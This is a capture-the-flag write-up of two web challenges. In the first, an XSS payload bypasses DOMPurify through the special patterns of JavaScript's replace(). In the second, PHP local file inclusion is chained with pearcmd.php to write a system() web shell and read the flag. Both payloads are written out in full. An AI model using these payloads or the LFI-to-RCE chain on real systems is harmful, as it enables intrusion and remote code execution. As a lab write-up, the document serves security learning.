---
title: CAT CTF 26 — Entry Level
published: 2026-03-25
description: Writeup for CAT CTF 26 Entry Level challenges
tags:
  - CTF
  - XSS
  - PHP
  - RCE
category: CTF
draft: false
pinned: false
encrypted: false
password: ""
image: https://miro.medium.com/v2/resize:fit:695/1*FFUyRKJ5mb8AH0mfob6O0g.png
lang: en
comment: true
---

## Table of Contents
- [Challenge 1 — Purified? (XSS)](#challenge-1--purified-xss)
- [Challenge 2 — LFI to RCE (PHP)](#challenge-2--lfi-to-rce-php)





Let’s not waste time and let’s go :
## Challenge 1 — Purified? (XSS)

<div align="center">

![](https://miro.medium.com/v2/resize:fit:484/1*l0vhY3PxigbpyfFWxqDIlA.png)

</div>
When we open the challenge link we will find Notes section and Report link

Press enter or click to view image in full size
<div align="center">

![](https://miro.medium.com/v2/resize:fit:700/1*bkEO7ZcBMFU-ARaDd2DFnQ.png)

</div>

When i tried basic payload such a `<scritp>alert(1)</script>` and `<svg/onload=alert(1)>`  
it give me like that in the source code

```javascript
<svg></svg>
```

so that make me know it filtered **script tag** and any **event handler**

so this time to see the source code

server.js :

```javascript
const express = require('express');  
const createDOMPurify = require('dompurify');  
const { JSDOM } = require('jsdom');  
const window = new JSDOM('').window;  
const DOMPurify = createDOMPurify(window);  
const app = express();  
const port = Number(process.env.PORT || 5000);  
const botVisitUrl = process.env.BOT_VISIT_URL || 'http://bot:3000/visit';
```

--- 

```javascript
function renderPage(rawContent = '', reportMessage = '') {  
const cleanContent = DOMPurify.sanitize(rawContent);  
let noteHtml = '';  
if (cleanContent) {  
noteHtml = `<div class="note"><b>Your Note:</b><br>${cleanContent}</div>`;  
}  
const reportHtml = reportMessage ? `<div class="msg">${reportMessage}</div>` : '';  
return PAGE_TEMPLATE  
.replace('{{NOTE_SECTION}}', noteHtml)  
.replace('{{REPORT_MESSAGE}}', reportHtml);  
}
```

When i see **Dompurify** and i was have **package.json** file i go to search a exploit to this and how to bypass  
i was spend like 2 hours in this scenario with no progress  
and that learn me you must complete reading the source code

we will note in the **renderPage** function it use **replace**

after a said what i do let’s learn more about replace function  
The `**replace()**` method of `[String](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String)` values returns a new string with one, some, or all matches of a `pattern` replaced by a `replacement`. The `pattern` can be a string or a `RegExp`

example :

```javascript
const x = "a";  
const y = x.replace("a","b");  
console.log(y); // b
```
--- 

```javascript
const paragraph = "I LOVE Java scirpt ";  
console.log(paragraph.replace("LOVE", "Hate"));  
// i Hate java script
```

Ok that’s nice next in the pattern we have special replacement patterns :

Press enter or click to view image in full size
<div align="center">

![](https://miro.medium.com/v2/resize:fit:700/1*WPrTO8LVU0FTCc6_48mcEA.png)

</div>

``` javascript
const x = "aaaB"  
x.replace("B","1$'2")  
'aaa12'  
x.replace("B","1$`2")  
'aaa1aaa2'
```

if you want to learn more about replace function :


## String.prototype.replace() - JavaScript | MDN

### The replace() method of String values returns a new string with one, some, or all matches of a pattern replaced by a…

#### [developer.mozilla.org](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace?source=post_page-----e369bf8d16f2---------------------------------------#description)

so we can use this payload

``` html
<img src="abc123$`<img src=x onerror=alert(1)>" />

```

Press enter or click to view image in full size
<div align="center">

![](https://miro.medium.com/v2/resize:fit:700/1*0tfwVTy2BAIHgucfCCfQ5Q.png)

</div>

some edits and add your webhook you will come up with this :

Press enter or click to view image in full size
<div align="center">

![](https://miro.medium.com/v2/resize:fit:700/1*y_dvvez3xDN-ZnYm0te_4Q.png)

</div>

When i searched i found the same scenario at `0ctf` you can look at it



## 0ctf 2025 - ezmd - 5 solves

### Recommended: Full video write-up

#### [cyber-man.pl](https://cyber-man.pl/0ctf-2025-ezmd-web?source=post_page-----e369bf8d16f2---------------------------------------)

--- 

## Challenge 2 — LFI to RCE (PHP)

<div align="center">

![](https://miro.medium.com/v2/resize:fit:475/1*9tLJ6SopeWKZVlGmbifhfw.png)

</div>
when we opened the challenge we found this source code

```php
<?php  
$file = $_GET['file'] ?? null;  
if ($file) {  
    if (strpos($file, 'file://') === 0) {  
        include($file);  
    }  
} else {  
    highlight_file(__FILE__);  
    }
```
That mean that we have only LFI but we want RCE

First i tried this :

```
http://167.99.34.2:8888/?file=file:///var/www/html/flag.php

```

<div align="center">

![](https://miro.medium.com/v2/resize:fit:700/1*A4tGuZTtRz8KAJfrKtVIfw.png)

</div>
i found PEAR_config

so i used this keyword to search

```
rce via pear config file php
```

i found that we must check if the `pearcmd.php` found or not

```
http://167.99.34.2:8888/?file=file:///usr/local/lib/php/pearcmd.php
```

<div align="center">

![](https://miro.medium.com/v2/resize:fit:700/1*MLPrS8DhQJ_l0TE-4RVaIQ.png)

</div>
no error it’s exist

then we will create RCE :
```php
<?= system($_GET[0];?>
```

--- 
 
```
http://167.99.34.2:8888/?file=file:///usr/local/lib/php/pearcmd.php&+config-create+/%3C?=system($_GET[0]);?%3E+/tmp/shell.php
```

<div align="center">

![](https://miro.medium.com/v2/resize:fit:700/1*gjAs8WSK0aj1HrHgIisDTw.png)

</div>
let’s try to get id :


<div align="center">

![](https://miro.medium.com/v2/resize:fit:700/1*3Eo62xJKbVQj-vTV0UM1UQ.png)

</div>
let’s read the flag :


<div align="center">

![](https://miro.medium.com/v2/resize:fit:700/1*i4aLx73o7t0FthoDYfh0CQ.png)

</div>

```
CATF{TH3_M05T_TH1NG_1_L0V3_AB0UT_PHP_15_TH4T_H0W3V3R_SM4LL_TH3_C0D3_15_Y0U_C4N_ALW4Y5_G3T_4N_RCE}
```

And that’s all, hope you find it well